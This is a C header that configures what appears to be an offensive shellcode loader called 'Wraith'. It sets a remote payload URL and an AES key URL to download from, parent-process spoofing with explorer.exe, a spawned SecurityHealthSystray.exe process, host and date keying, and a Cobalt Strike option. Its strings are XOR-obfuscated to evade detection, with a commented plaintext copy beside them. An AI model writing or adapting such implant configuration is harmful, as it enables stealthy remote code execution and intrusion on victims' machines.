#pragma once

/*
#define MUTEX_NAME "Wraith"
#define WORKSTATION // Comment it if targeting a domain joined machine
#define HOST_ARTIFACT "e76d45370550a00b770abdee4ddd35361dcf3f0d861e34712a87af0b3ac7bcad"
#define YEAR 2020
#define MONTH 10
#define DAY 20
#define PAYLOAD_URL "https://raw.githubusercontent.com/slaeryan/DigitalOceanTest/master/msgbox_x64.txt"
#define AES_KEY_URL "https://raw.githubusercontent.com/slaeryan/DigitalOceanTest/master/note.txt"
#define ACG // Comment it if using with Cobalt Strike payload
#define PARENT_PROCESS "explorer.exe"
#define SPAWN "c:\\windows\\system32\\SecurityHealthSystray.exe"
#define XOR_KEY 'W'
*/

#define MUTEX_NAME {0,37,54,62,35,63}
#define WORKSTATION // Comment it if targeting a domain joined machine
#define HOST_ARTIFACT {50,96,97,51,99,98,100,96,103,98,98,103,54,103,103,53,96,96,103,54,53,51,50,50,99,51,51,51,100,98,100,97,102,51,52,49,100,49,103,51,111,97,102,50,100,99,96,102,101,54,111,96,54,49,103,53,100,54,52,96,53,52,54,51}
#define YEAR 2020
#define MONTH 10
#define DAY 26
#define PAYLOAD_URL {63,35,35,39,36,109,120,120,37,54,32,121,48,62,35,63,34,53,34,36,50,37,52,56,57,35,50,57,35,121,52,56,58,120,36,59,54,50,37,46,54,57,120,19,62,48,62,35,54,59,24,52,50,54,57,3,50,36,35,120,58,54,36,35,50,37,120,58,36,48,53,56,47,8,47,97,99,121,35,47,35}
#define AES_KEY_URL {63,35,35,39,36,109,120,120,37,54,32,121,48,62,35,63,34,53,34,36,50,37,52,56,57,35,50,57,35,121,52,56,58,120,36,59,54,50,37,46,54,57,120,19,62,48,62,35,54,59,24,52,50,54,57,3,50,36,35,120,58,54,36,35,50,37,120,57,56,35,50,121,35,47,35}
#define ACG // Comment it if using with Cobalt Strike payload
#define PARENT_PROCESS {50,47,39,59,56,37,50,37,121,50,47,50}
#define SPAWN {52,109,11,11,32,62,57,51,56,32,36,11,11,36,46,36,35,50,58,100,101,11,11,4,50,52,34,37,62,35,46,31,50,54,59,35,63,4,46,36,35,37,54,46,121,50,47,50}
#define XOR_KEY 'W'
